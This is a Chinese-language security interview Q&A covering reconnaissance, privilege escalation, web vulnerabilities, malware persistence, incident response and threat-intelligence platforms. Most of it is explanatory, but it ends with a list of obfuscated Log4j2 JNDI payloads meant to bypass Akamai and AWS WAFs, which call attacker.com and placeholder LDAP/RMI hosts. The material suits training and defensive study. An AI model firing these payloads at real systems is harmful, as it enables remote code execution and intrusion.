1. 漏洞利用：不同的CMS可能存在不同的已知漏洞和安全弱点。通过确定目标网站所使用的CMS，攻击者可以针对该CMS已知的漏洞进行利用，例如SQL注入、跨站脚本（XSS）、代码执行漏洞等。攻击者可以针对该CMS的特定版本或插件漏洞进行有针对性的攻击。
2. 工具和脚本选择：确定目标CMS后，攻击者可以选择特定的工具、脚本或Exploit来执行攻击。这些工具和脚本通常是针对特定CMS的漏洞利用和攻击技术开发的，因此，准确判断CMS可以帮助攻击者选择最有效的工具和脚本。
3. 知识和经验应用：攻击者可能会具有特定CMS的漏洞利用和攻击经验。他们熟悉该CMS的内部机制、文件结构和常见的安全问题，因此，判断目标CMS可以帮助攻击者应用其知识和经验，更好地进行攻击。
4. 提高攻击成功率：针对特定CMS的攻击通常比较精确和针对性，因为攻击者可以利用特定CMS的已知漏洞和弱点，执行特定的攻击步骤和技术。通过准确判断目标CMS，攻击者可以提高攻击的成功率，因为他们可以专注于特定的漏洞利用和攻击方法，减少尝试和错误的可能性。

### 如何手工判断靶标站点是Windows、Linux服务器？

1. HTTP响应头信息：通过查看HTTP响应头中的"Server"字段，可以获取服务器的类型信息。例如，"Server: Apache/2.4.18 (Ubuntu)" 表示使用的是 Ubuntu Linux 上的 Apache 服务器，而 "Server: Microsoft-IIS/10.0" 则表示使用的是 Microsoft IIS 服务器，它通常在 Windows 上运行。
2. 错误页面的样式和内容：不同的服务器平台在生成错误页面时可能会有不同的样式和内容。例如，Apache 服务器在出现错误时会显示默认的错误页面，而 IIS 服务器则会显示较为简洁的错误页面。观察错误页面的样式和内容，可以得到一些线索来判断服务器平台。
3. 端口扫描和服务识别：使用端口扫描工具（如Nmap）对目标服务器进行扫描，识别开放的端口和服务信息。某些服务（如SMB）通常与 Windows 服务器相关联，而其他服务（如SSH、HTTP）则更常见于 Linux 服务器。根据扫描结果，可以得出一些关于服务器平台的初步判断。

### Windows和Linux的提权？

提权是指将当前用户的权限提升为更高的权限，以便执行需要更高权限的操作。攻击者可以利用系统中的漏洞和安全问题，实现提权攻击，以获取更高的权限，并掌控系统。提权可分为纵向提权与横向提权：

- 纵向提权：低权限角色获得高权限角色的权限。
- 横向提权：获取同级别角色的权限。

Windows常用的提权方法：

- 系统内核溢出漏洞提权：利用系统中的漏洞和安全问题，执行恶意代码，提升权限。
- 访问令牌窃取：攻击者可以通过访问令牌窃取的方式，获取当前用户或其他用户的权限，提升自己的权限。
- 服务提权：利用系统中存在的服务漏洞，提升权限到本地系统或域管理员级别。
- 数据库提权
- 错误的系统配置提权
- 组策略首选项提权
- WEB中间件漏洞提权
- DLL劫持提权
- 滥用高危权限令牌提权

Linux的常用提权方法：

- suid提权：利用系统中存在的suid程序的漏洞，提升权限到root账户级别。
- 文件系统提权：攻击者可以通过修改文件系统中的文件或目录的权限和所有权，提升自己的权限。

-  Linux内核漏洞提权：攻击者可以通过利用内核漏洞，实现提权攻击。
- 低权限用户目录下可被Root权限用户调用的脚本提权（SUID）
- 环境变了劫持高权限程序提权
- sudoer配置文件错误提权





### 无法连接3389端口的几种情况？

1. 防火墙配置：目标主机上的防火墙可能配置了规则，阻止对3389端口的访问。防火墙规则可以是在主机上配置的本地防火墙，也可以是网络边界上的防火墙设备。
2. 网络访问控制列表（ACL）：网络设备（如路由器、交换机）上的访问控制列表可能限制了对3389端口的访问。ACL可以配置在网络设备上，用于限制特定IP地址或IP地址范围对端口的访问。
3. 服务未启动：3389端口用于远程桌面协议（RDP）服务，如果目标主机上没有启动RDP服务，那么连接请求将无法成功。确保目标主机上的RDP服务已启动。
4. 目标主机不可达：目标主机可能处于离线状态或无法通过网络访问。这可能是由于拔网线、网络故障、主机故障、路由问题等引起的。
5. 端口被占用：在某些情况下，3389端口可能已被其他服务或进程占用，导致RDP无法在该端口上监听连接请求。这可能是由于配置错误、其他应用程序冲突等原因引起的。
6. NAT配置：如果目标主机位于NAT（网络地址转换）后面，需要确保NAT设备正确配置，将外部网络流量正确地映射到目标主机的3389端口。

> 1.3389端口处于关闭状态
>
> 2.远程桌面默认端口号已被修改
>
> 3.防火墙拦截
>
> 4.处于内网环境
>
> 5.超过了服务器最大连接数
>
> 6.管理员设置了权限，指定用户才能通过3389端口进行远程桌面访问

### CSRF、SSRF、重放攻击有什么区别？

CSRF（Cross-Site Request Forgery），SSRF（Server-Side Request Forgery）和重放攻击（Replay Attack）是三种不同类型的攻击，它们有以下区别：

1. CSRF（跨站请求伪造）： CSRF攻击利用用户已经通过身份验证的会话来执行未经用户授权的操作。攻击者通过诱使受害者在浏览器中访问恶意网站，该网站会发送请求来执行特定操作，而该请求会利用受害者在另一个网站上的有效会话。CSRF攻击主要针对用户在不同网站之间共享身份验证凭证（如cookie）的情况，攻击者利用这种信任关系来执行操作，例如更改密码、发送消息等。
2. SSRF（服务器端请求伪造）： SSRF攻击是一种服务器端漏洞，攻击者通过在目标服务器上执行未经授权的请求来利用该漏洞。攻击者可以通过控制请求的参数，使目标服务器发起对内部网络或其他外部服务的请求。SSRF攻击的危害在于攻击者可以通过目标服务器绕过防火墙和网络边界，访问不应公开访问的资源，甚至执行潜在的内部攻击。
3. 重放攻击： 重放攻击是指攻击者通过重播之前的有效通信来伪装为合法用户。攻击者截获合法用户的请求并在稍后重新发送，目标服务器会认为这些请求是合法的并执行相应的操作。重放攻击通常针对网络通信过程中的认证凭证或会话标识，攻击者可以使用这些凭证来模拟合法用户并执行操作，如发送重复的交易请求、重复提交表单等。

总结起来，CSRF是一种利用用户身份验证会话进行未经授权操作的攻击，SSRF是一种利用服务器端漏洞发起未经授权请求的攻击，重放攻击是一种通过重播之前有效通信来伪装为合法用户的攻击。它们的攻击目标、利用方式和防护措施都有所不同。

### 代码执行、文件读取、命令执行的函数都有哪些？

- 代码执行：`eval()`, `exec()`, `system()`, `call_user_func()`, `call_user_func_array()`, `create_function()`, `array_map()`, `Runtime.getRuntime().exec()`, `System.Diagnostics.Process.Start()`。
- 文件读取：`fopen()`, `readfile()`, `file_get_contents()`, `fread()`, `fgetss()`, `show_source()`, `file()`。
- 命令执行：`exec()`, `shell_exec()`, `system()`, `passthru()`, `pcntl_exec()`。

在编写和使用这些函数时，特别是在接受用户输入或动态构建命令或文件路径时，应避免安全漏洞，如代码注入、文件读取漏洞和命令注入漏洞。建议采取必要的安全措施，如输入验证、参数化查询和权限控制，以防止恶意利用和安全风险。

### 你知道哪些常见的漏洞？能否描述出漏洞原理？以及常见的利用方式和相关工具？

1. SQL注入漏洞：

   - 原理：未对用户输入的数据进行充分验证和过滤，使攻击者能够在SQL查询中注入恶意的SQL代码。

   - 利用方式：通过在用户输入中插入恶意的SQL语句，攻击者可以执行非授权的数据库操作，如获取敏感数据、修改数据表等。
   - 相关工具：SQLMap、Burp Suite、Havij等。

2. 跨站脚本攻击（XSS）漏洞：

   - 原理：未对用户输入的数据进行充分转义或过滤，使攻击者能够将恶意脚本注入到网页中，并在受害者浏览器中执行。
   - 利用方式：攻击者通过在网页中注入恶意脚本，可以窃取用户的敏感信息、劫持会话、操纵页面内容等。
   - 相关工具：XSStrike、Burp Suite、BeEF等。

3. 跨站请求伪造（CSRF）漏洞：

   - 原理：未对用户提交的请求进行充分验证和防护，使攻击者能够伪造合法用户的请求，以执行未经授权的操作。
   - 利用方式：攻击者通过诱使受害者访问恶意网页，触发受害者的浏览器向目标网站发送伪造的请求，以执行操作，如更改密码、发起转账等。
   - 相关工具：CSRFTester、Burp Suite、OWASP Zap等。

4. 服务器端请求伪造（SSRF）漏洞：

   - 原理：未正确验证和限制用户输入的URL参数，使攻击者能够在服务器上发起未授权的请求，甚至访问内部资源。
   - 利用方式：攻击者通过构造恶意的URL，使目标服务器发起对内部网络或其他外部服务的请求，可能导致信息泄露、内部资源访问等问题。
   - 相关工具：SSRFmap、Gopherus、Burp Suite等。

5. 文件包含漏洞：

   - 原理：未正确过滤和验证用户输入的文件路径，使攻击者能够包含恶意文件，导致服务器执行恶意代码。
   - 利用方式：攻击者通过构造恶意文件路径，使目标服务器包含恶意代码文件，可能导致远程代码执行、敏感信息泄露等问题。
   - 相关工具：LFI Suite、Burp Suite、Fimap等。

这只是一小部分常见漏洞的例子。还有许多其他漏洞，如文件上传漏洞、命令注入漏洞、LDAP注入漏洞等。在进行渗透测试或漏洞分析时，通常使用一系列工具，如Burp Suite、Metasploit、Nmap、SQLMap等，以辅助发现和利用这些漏洞。

### 常见的中间件有哪些？它们有哪些漏洞？

常见的中间件包括：

1. Web服务器中间件：
   - Apache HTTP Server 
   - Nginx
   - Microsoft IIS（PUT漏洞、短文件名拆解、远程代码执行、解析漏洞）
   - Lighttpd
2. 应用服务器中间件：
   - Apache Tomcat
   - JBoss （反序列化漏洞，war后门文件部署）
   - WebLogic
   - WebSphere
3. 数据库中间件：
   - MySQL
   - PostgreSQL
   - Oracle Database
   - Microsoft SQL Server
4. 缓存中间件：
   - Redis
   - Memcached
   - Apache Ignite
   - Elasticsearch
5. 消息中间件：
   - RabbitMQ
   - Apache Kafka
   - ActiveMQ
   - IBM MQ

这些中间件在不同的配置和版本中可能存在各种漏洞和安全问题，其中一些常见的漏洞包括：

- 身份验证和授权问题：中间件可能存在弱密码、默认凭证或错误配置，导致未经授权的访问和权限提升。
- 远程代码执行（RCE）：某些中间件可能受到远程代码执行漏洞的影响，攻击者可以通过构造恶意请求或输入执行任意代码。
- 路径遍历和文件包含：中间件对用户提供的文件路径或包含的文件进行不充分的验证，可能导致攻击者读取、写入或执行任意文件。
- SQL注入：中间件在处理用户提供的数据时未正确过滤或转义，可能导致攻击者注入恶意的SQL语句，执行未授权的数据库操作。
- XML外部实体（XXE）攻击：中间件未正确处理XML输入，可能导致攻击者读取敏感文件或进行服务器端请求伪造（SSRF）等攻击。
- 跨站脚本（XSS）攻击：中间件未正确过滤用户输入，可能导致攻击者在用户浏览器中执行恶意脚本。
- 任意文件上传：中间件未正确限制文件上传的类型和目标路径，可能导致攻击者上传恶意文件并执行。

这些只是一些常见的漏洞类型，具体的中间件漏洞取决于其实现和配置。及时更新中间件版本、配置安全设置、进行安全审计和漏洞扫描，以及遵循最佳安全实践，都是减少中间件漏洞风险的重要措施。

### 正向Shell和反向Shell的区别。

正向Shell和反向Shell是两种不同的Shell连接方式，它们的区别如下：

1. 正向Shell（Forward Shell）：
   - 正向Shell是一种主动连接的方式，攻击者通过在目标系统上部署恶意代码或后门，等待被攻击者触发。被攻击者与恶意代码建立连接，并提供Shell访问权限。
   - 攻击者需要事先在目标系统上成功部署恶意代码或后门，通常需要攻破目标系统的安全防护措施，如通过漏洞利用或社会工程等方式。
   - 正向Shell通常用于攻击外部系统，因为攻击者需要与目标系统建立连接，可能受到网络拓扑和防火墙限制。
2. 反向Shell（Reverse Shell）：
   - 反向Shell是一种被动连接的方式，攻击者在自己的系统上部署恶意代码或后门，等待被攻击者的主机与其建立连接。一旦连接建立，攻击者获得对被攻击者主机的Shell访问权限。
   - 攻击者不需要直接连接到被攻击者主机，而是等待被攻击者主动与其系统建立连接。这通常是通过将恶意代码注入到受感染的系统上，并与攻击者控制的C&C（Command and Control）服务器建立连接来实现。
   - 反向Shell通常用于攻击内部系统，因为攻击者无需直接连接到目标系统，而是通过在外部服务器上等待连接的方式。

总体而言，正向Shell和反向Shell都是用于建立远程访问的手段，但它们的连接方式和建立连接的角度不同。正向Shell是攻击者主动连接到被攻击者的系统，可用于攻击者处于内网、被攻击者处于公网的情况；而反向Shell是被攻击者主动连接到攻击者的系统，可用于攻击者处于外网、被攻击者处于内网的情况。

### ⭐SQL注入的种类？是否熟练使用sqlmap？

SQL注入的种类可以分为以下几类：

（整数型注入、字符型注入、报错注入、布尔盲注、时间盲注、内联注释绕过注入）

1. 基于错误的注入（Error-based Injection）：利用应用程序在处理SQL语句时发生的错误来获取数据库信息或执行恶意操作。
2. 基于联合查询的注入（Union-based Injection）：通过在SQL查询中使用UNION操作符，将恶意的查询结果合并到原始查询结果中，从而获取额外的数据。
3. 基于布尔盲注的注入（Boolean-based Blind Injection）：通过构造布尔条件，利用应用程序的不同响应来推断数据库中的数据。
4. 基于时间延迟的注入（Time-based Blind Injection）：利用应用程序对延迟函数的支持，在注入点上执行延迟操作，通过观察应用程序的响应时间来推断数据库中的数据。
5. 基于堆叠查询的注入（Stacked Queries Injection）：在一次查询中执行多个SQL语句，从而实现多个操作或绕过限制。
6. 基于注释的注入（Comment-based Injection）：通过在注入点上使用特定的SQL注释语法，绕过应用程序的过滤和检测。

sqlmap是一个流行的自动化SQL注入工具，用于检测和利用应用程序中的SQL注入漏洞。sqlmap具有强大的功能，可以自动检测注入漏洞、获取数据库信息、执行SQL语句、绕过防御措施等。它支持各种注入技术和数据库后端，并提供了丰富的选项和参数来适应不同的测试场景。

### SQL注入的危害

1. 获取数据库数据：数据库中存放的用户的隐私信息的泄露，脱取数据库中的数据内容（脱库），可获取网站管理员帐号、密码悄无声息的进行对网站后台操作等。

2. 网页篡改：通过操作数据库对特定网页进行篡改，严重影响正常业务进行与受害者信誉。

3. 网页挂马：将恶意文件或者木马下载链接写入数据库，修改数据库字段值，进行挂马攻击。

4. 篡改数据库数据：攻击数据库服务器，篡改或者添加普通用户或者管理员帐号。

5. 获取服务器权限：列取目录、读取、写入shell文件获取webshell，远程控制服务器，安装后门，经由数据库服务器提供的操作系统支持，让攻击者得以修改或控制操作系统。

### ⭐预防SQL注入的方法和原理

SQL注入（SQL Injection）是一种常见的Web应用程序安全漏洞，攻击者可以通过在应用程序的输入框中注入恶意SQL语句，从而控制数据库进行非法操作，包括数据泄露、数据篡改、服务器劫持等。为了预防SQL注入，可以采取以下方法：

1. 过滤用户输入：对于用户输入的数据进行严格的过滤和验证，包括特殊字符、注释符、SQL关键字等。这样可以排除一些明显的攻击。例如，可以使用防注入函数或者正则表达式过滤掉一些非法字符或格式。还可以使用白名单机制，只允许输入指定的字符和格式。
2. 使用参数化查询：使用参数化查询语句，参数化查询是指使用占位符代替直接将用户输入的值嵌入SQL语句中，避免将用户输入的数据直接拼接到SQL语句中。这样可以避免攻击者通过输入恶意的SQL代码来破坏原有的SQL语句结构。参数化查询可以使用预编译语句或存储过程实现。
3. 最小化权限原则：将数据库用户的权限最小化，只授权必要的访问权限，避免攻击者利用注入漏洞获取过多的访问权限。**数据库用户应该被授予最少必需的权限，这样可以限制攻击者对数据库的访问和操作。**
4. 避免使用动态SQL语句：动态SQL语句是指在应用程序中构建SQL语句的过程中，将用户输入的值直接嵌入到SQL语句中。这种方式容易受到SQL注入攻击，因此应该避免使用。
5. 安全编码：使用安全的编码方式，避免将用户输入的数据作为HTML或JavaScript代码输出到页面上。
6. 对日志和错误信息进行安全处理：应用程序应该记录日志和错误信息，但是这些信息可能包含敏感数据。因此，需要对其进行安全处理，避免将敏感信息泄露给攻击者。

### ⭐正向代理和反向代理的区别。

正向代理和反向代理是两种不同的代理服务器配置和使用方式，它们的区别如下：

1. 正向代理（Forward Proxy）：
   - 正向代理是客户端与目标服务器之间的中间代理服务器。客户端发送请求到正向代理服务器，正向代理服务器再将请求转发给目标服务器，然后将目标服务器的响应返回给客户端。
   - 客户端对目标服务器是透明的，目标服务器只知道请求来自正向代理服务器，无法直接识别客户端。
   - 正向代理常用于在私有网络内部，为内部客户端提供访问外部网络资源的代理服务。它可以提供访问控制、缓存、安全性等功能。
2. 反向代理（Reverse Proxy）：
   - 反向代理是位于目标服务器和客户端之间的中间代理服务器。客户端发送请求到反向代理服务器，反向代理服务器根据配置的规则将请求转发给后端的目标服务器，然后将目标服务器的响应返回给客户端。
   - 客户端对目标服务器是透明的，客户端只知道请求发送给反向代理服务器，无法直接识别目标服务器。
   - 反向代理常用于负载均衡、缓存、SSL加密、安全防护等方面。它可以隐藏后端服务器的细节，提供负载均衡和高可用性，并增加了安全性。

总结： 正向代理是为了代理客户端访问外部网络资源，而反向代理是为了代理客户端访问内部的目标服务器。

### 如何判断设备资产是否已经失陷？

判断设备资产是否已经失陷可以涉及多个方面的观察和分析。以下是一些常见的指标和方法，用于评估设备是否已经失陷：

1. 异常网络活动：监控网络流量和日志，寻找异常的网络活动模式，例如大量的未经授权的出站连接、大量的未知协议流量、异常的数据传输量等。
2. 异常系统行为：观察设备的系统行为，包括CPU使用率、内存使用率、磁盘活动等指标，寻找异常的系统行为模式，例如异常的进程活动、异常的系统资源消耗等。
3. 异常登录活动：监控设备的登录活动，包括成功和失败的登录尝试。如果有大量的失败登录尝试或未知用户登录成功，可能意味着设备已被入侵。
4. 异常文件和进程：检查设备上的文件和进程，寻找不明文件或进程的存在，特别是与已知的恶意软件相关的文件或进程。
5. 异常日志记录：审查设备的系统日志和应用程序日志，寻找异常的日志记录模式，例如大量的错误日志、异常的访问日志等。
6. 安全漏洞和补丁状态：评估设备的安全漏洞和补丁状态，如果设备存在已知的安全漏洞且未进行及时修复，可能会导致设备失陷。
7. 异常用户行为：监控设备的用户行为，寻找异常的用户活动模式，例如大量的权限提升、未经授权的访问尝试、异常的文件操作等。

### 木马驻留系统的方式有哪些？

如果是Windows系统的话，木马驻留系统的常见方式如下：

1. 启动项修改：木马可以通过修改系统的启动项来实现自启动。它可以添加自己的启动项，使得每次系统启动时都会加载并执行木马程序。
2. 注册表修改：木马可以修改系统的注册表项，将自己添加为系统的自启动项。它可以修改"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"或"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"等注册表项。
3. 系统服务修改：木马可以注册为系统服务，以实现在系统启动时自动加载和运行。它可以通过修改服务管理器或使用特权提升技术来添加、修改或隐藏自己的服务。
4. 驱动程序加载：某些高级的木马可能会注册为驱动程序，并在系统启动时加载驱动程序。这样可以实现对系统底层的操作和控制。
5. 隐藏文件/文件夹：木马可以将自己隐藏在系统的文件或文件夹中，使其不易被用户发现。它可以修改文件属性、文件名或文件夹属性，以逃避常规的查找方法。
6. 进程注入：木马可以通过进程注入的方式将自己注入到正常进程的内存中，实现隐藏和持久化。它可以选择一个常见的系统进程，将自己注入到该进程中，并利用该进程的执行权限进行活动。
7. 驻留在硬盘分区或引导扇区：某些特殊的木马可能会驻留在硬盘分区或引导扇区中，以在系统启动时加载和执行。这种方式往往比较隐蔽，对系统的恢复和清除也更加困难。
8. 利用系统漏洞：木马可以利用系统或应用程序的漏洞，实现自动化的安装和驻留。通过利用已知或未知的漏洞，木马可以在系统中植入自身并实现持久化。

如果是Linux系统的话，木马驻留系统的常见方式如下：

1. 启动脚本修改：木马可以修改系统的启动脚本，如/etc/rc.local或/etc/init.d/中的脚本文件，将自己添加为系统的启动项，以实现系统启动时自动加载和运行。
2. Crontab任务：木马可以利用Crontab服务，通过修改用户的Crontab任务列表，将自己添加为定时任务，定时运行并实现持久化。
3. SSH后门：木马可以通过修改SSH配置文件（如/etc/ssh/sshd_config）或在/etc/ssh/authorized_keys中添加恶意公钥，以实现远程访问和控制。
4. PAM模块修改：木马可以通过修改PAM（Pluggable Authentication Modules）模块，如/etc/pam.d/目录下的配置文件，实现对登录验证的绕过或篡改。
5. LD_PRELOAD劫持：木马可以使用LD_PRELOAD环境变量，通过预加载共享库的方式，劫持目标程序的函数调用，实现隐藏和持久化。
6. 内核模块加载：某些高级的木马可能会注册为Linux内核模块，通过加载模块的方式实现对系统底层的操作和控制。
7. 定制的后门程序：木马可以自行编写后门程序，并将其安装到系统中的指定位置，如/usr/bin/或/usr/sbin/目录下，以实现后续远程访问和操控。
8. 利用系统漏洞：木马可以利用Linux系统或应用程序的漏洞，实现自动化的安装和驻留。通过利用已知或未知的漏洞，木马可以在系统中植入自身并实现持久化。

Linux系统相比于Windows系统具有更高的安全性和可配置性，因此木马在Linux系统中的驻留方式可能更为隐蔽和复杂。定期更新系统和应用程序的补丁、限制特权访问、使用防火墙和入侵检测系统等是重要的防范措施。

### 如何针对攻击事件进行溯源？常见的反制思路是什么？

针对攻击事件进行溯源是一个复杂的过程，需要综合使用多种技术和方法来追踪攻击者的行为。以下是一些常见的方法和反制思路：

1. 日志分析：仔细审查受攻击系统的日志记录，包括网络流量日志、安全设备日志、系统日志等，以查找与攻击相关的信息，例如源IP地址、攻击时间戳、攻击载荷等。
2. 收集数字证据：保存和保护与攻击事件相关的数字证据，例如攻击流量的网络包捕获（PCAP）文件、恶意文件、日志文件等。这些证据可以在后续的分析和调查中发挥重要作用。
3. 威胁情报分析：利用公开的威胁情报和内部情报，对攻击事件进行分析和比对，以确定攻击者可能使用的工具、技术和攻击模式。这有助于识别攻击者的可能来源和行为模式。
4. 异常行为检测：使用入侵检测系统（IDS）或入侵防御系统（IPS）等安全工具，监视网络和系统中的异常行为，例如异常的网络流量、未经授权的访问、异常的用户行为等。这有助于及早发现攻击事件。
5. 数字取证：在发现攻击事件后，采用数字取证的方法来收集和保护相关证据，以确保取证过程的合法性和可靠性。这包括采集和保存关键数据、元数据以及其他相关信息。
6. 协同合作：攻击溯源往往需要跨部门、跨组织的合作。与内部安全团队、合作伙伴和执法部门建立有效的合作关系，共享信息和资源，加强攻击事件的追踪和调查工作。
7. 响应和修复：根据攻击事件的严重程度和影响，采取适当的响应措施和修复措施，例如断开受感染的系统与网络的连接、修补安全漏洞、恢复受损的数据等。

### 告警日志分析的思路

告警日志分析是安全运营中非常重要的一环，它可以帮助识别潜在的安全威胁和异常行为。常见的告警日志分析思路如下：

1. 收集和整理：收集来自不同系统和设备的告警日志，包括网络设备、防火墙、入侵检测系统、应用程序等。将这些日志进行整理，以便进一步的分析和处理。
2. 过滤和筛选：根据实际情况，通过设定合适的过滤条件和规则，将日志中的无关或低优先级的事件过滤掉，只保留重要的告警事件。这可以减少分析的工作量，并聚焦在关键的安全事件上。
3. 关联和分析：将不同设备和系统的告警日志进行关联，以便发现横向或纵向的攻击路径和行为模式。通过分析告警的时间戳、源IP地址、目标IP地址、协议、端口等信息，可以揭示攻击者的行为轨迹。
4. 威胁情报对比：将收集到的威胁情报和已知的恶意行为进行对比，以识别可能的恶意活动和攻击手段。这可以帮助快速识别并应对新出现的威胁。
5. 异常检测：通过使用机器学习、行为分析等技术，寻找告警日志中的异常模式和行为。例如，检测大量的登录失败尝试、异常的数据传输、非常规的用户行为等。
6. 报告和响应：根据分析结果生成报告，指出潜在的威胁和建议的响应措施。及时采取适当的响应措施，例如封锁恶意IP地址、隔离受感染的系统、修补安全漏洞等。
7. 持续改进：将从告警日志分析中得出的经验教训和发现的新威胁，反馈到安全策略和控制措施中，以不断提高安全防护能力。

重要的是要建立一个规范化的告警日志分析流程，并利用自动化工具和技术来加快和增强分析的效率。同时，密切关注最新的安全威胁和漏洞信息，不断更新和调整分析的方法和规则，以适应不断变化的安全威胁环境。

### 如何还原【失陷路径】？

还原失陷路径是指通过分析和调查，追溯出一个系统或网络被攻击的具体路径和方式。以下是还原失陷路径的一般方法和步骤：

1. 收集证据：首先，收集和保留与失陷事件相关的所有证据。这包括日志文件、网络流量捕获、系统快照、恶意文件等。确保对证据进行适当的存储和保护，以确保其完整性和可用性。
2. 分析日志和流量：仔细分析收集到的日志文件和网络流量捕获，查找与攻击相关的异常或可疑活动。特别关注登录记录、命令执行、文件访问、网络连接等活动，以了解攻击者的行为和路径。
3. 调查系统和应用程序：对受影响的系统和应用程序进行调查，查找任何异常或被篡改的文件、配置更改或其他不寻常的活动。比较系统和应用程序的状态与正常状态的差异，以确定攻击的具体入口和路径。
4. 追踪攻击者活动：尽可能地追踪攻击者在系统中的活动，包括他们使用的工具、技术和攻击方法。通过分析攻击者在系统中的行为，可以揭示攻击路径和他们获取权限的方式。
5. 合并和重建：将收集到的所有证据和分析结果进行整合和重建。重建攻击路径的目标是尽可能还原攻击者的活动顺序和过程，以了解攻击的全貌和范围。
6. 制定修复措施：根据对失陷路径的还原和分析，确定系统和网络的安全漏洞和弱点。基于这些发现，制定和实施相应的修复措施，以防止类似攻击再次发生。

### 如何在【信息收集】上与红队做对抗？

与红队在信息收集上进行对抗需要有一定的策略和方法。以下是一些与红队对抗的信息收集技巧：

1. 了解自身信息暴露：首先，对自身组织的信息暴露情况进行评估。这包括公开可见的信息、社交媒体上的信息、员工的个人信息等。红队通常会利用这些信息来了解目标，并在攻击中使用。
2. 监控公开渠道：关注公开的信息渠道，如媒体报道、安全博客、漏洞报告等。红队可能会利用这些渠道发布攻击技术、漏洞信息或攻击事件的细节。及时跟踪这些信息，以便了解潜在的攻击趋势和技术。
3. 建立威胁情报能力：建立自己的威胁情报能力，通过订阅威胁情报提供商的服务或建立内部威胁情报团队。这样可以及时获取与自身相关的最新威胁情报，了解攻击者的行为模式、工具和技术。
4. 模拟攻击和漏洞扫描：进行模拟攻击和漏洞扫描，以评估自身系统和应用程序的安全性。通过模拟红队攻击的方式，暴露潜在的安全漏洞和弱点，并采取相应的修复措施。
5. 建立内部漏洞管理程序：建立内部的漏洞管理程序，包括定期的漏洞扫描、漏洞评估和漏洞修复。这可以帮助及时发现和修复系统中的安全漏洞，减少红队攻击的成功率。
6. 加强员工安全意识：培训和教育员工，提高他们的安全意识和对社会工程攻击的警觉性。红队通常会利用社会工程攻击手段获取信息或入侵系统，通过加强员工安全意识，可以减少这类攻击的成功率。
7. 持续改进防御措施：通过监控和分析攻击事件，不断改进防御措施和安全架构。红队的攻击行为可以帮助发现系统中的漏洞和弱点，从而加强防御措施，并建立更加强大的安全防护能力。

### 当收到钓鱼邮件的时候，说说处置思路？

及时的安全意识和合理的处置措施是防范钓鱼邮件的关键。当收到钓鱼邮件时，可以采取以下处置思路：

1. 保持冷静和警惕：首先要保持冷静和警惕，不要轻易相信邮件内容，尤其是来自不熟悉或可疑的发件人。
2. 不点击附件或链接：避免点击邮件中的附件或链接，因为它们可能包含恶意软件或指向钓鱼网站。即使邮件看起来很真实或诱人，也要保持谨慎。
3. 验证邮件的真实性：仔细检查邮件的发件人地址和内容，看是否存在拼写错误、语法错误或不合常理的要求。还可以通过与正常渠道联系发件人来验证邮件的真实性。
4. 不泄露个人信息：不要回复钓鱼邮件或提供个人敏感信息。真实的组织通常不会通过电子邮件来索取敏感信息，如密码、银行账号等。
5. 报告和删除邮件：将钓鱼邮件报告给组织的安全团队或网络管理员，并将其删除。这有助于提醒其他人注意该邮件的存在，并加强安全防范措施。
6. 加强安全意识培训：对组织内的员工进行针对钓鱼邮件的安全意识培训，教育员工如何识别和处理钓鱼邮件，以减少风险。
7. 更新安全软件和补丁：确保计算机和设备上安装了最新的安全软件和操作系统补丁，以减少被恶意软件利用的风险。
8. 监控和审查日志：对组织的网络和系统进行实时监控，并审查相关日志，以检测和追踪可能的钓鱼活动。
9. 加强网络安全防护：使用防火墙、入侵检测系统、反病毒软件等安全工具来加强网络安全防护，减少钓鱼邮件的风险。
10. 做好应急响应准备：建立应急响应计划，包括针对钓鱼邮件的处理流程和恢复措施，以便在出现安全事件时能够快速应对和恢复。

### 常用的威胁情报平台有哪些？有没有做过关于情报输出的工作？

常见的威胁情报平台包括：

1. VirusTotal：提供文件和URL的恶意软件扫描服务，收集全球的威胁情报。
2. AlienVault OTX：开放的威胁情报平台，用户可以共享和访问有关恶意IP地址、域名、文件哈希等信息。
3. IBM X-Force Exchange：IBM提供的威胁情报平台，包含全球的威胁数据和安全洞察。
4. ThreatConnect：提供综合的威胁情报平台，整合了威胁情报的收集、分析和分享功能。
5. Anomali ThreatStream：提供实时的威胁情报，包括漏洞信息、恶意IP地址、恶意文件等。
6. Recorded Future：聚合全球的威胁情报，提供实时的情报分析和预测功能。
7. MISP (Malware Information Sharing Platform)：开源的威胁情报平台，用于共享和分析威胁情报。





### 如何抓取密码？以及如何建立隐藏用户？

### Log4j2绕过的payload

- #### Akamai Bypass Log4j

```python
${jndi${123%25ff:-}:ldap://HOST:PORT/a}
```

- #### Amazon AWS WAf Bypass

```python
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
```

- #### 其他的绕过payloads

```python
${lower:${:a:d:-${lower:}}jndi:}

${jndi:ldap://attacker.com/a}

${j${upper:${lower:n}}di:ldap://attacker.com/a}

${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}

${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}

${${::-j}ndi:rmi://}

${${lower:jndi}:${lower:rmi}://}

${${lower:${lower:jndi}}:${lower:rmi}://

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

${jndi:rmi://adsasd.asdasd.asdasd}

${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

${j${upper:n:-}di:ldap://example.com:1389

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}

${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}

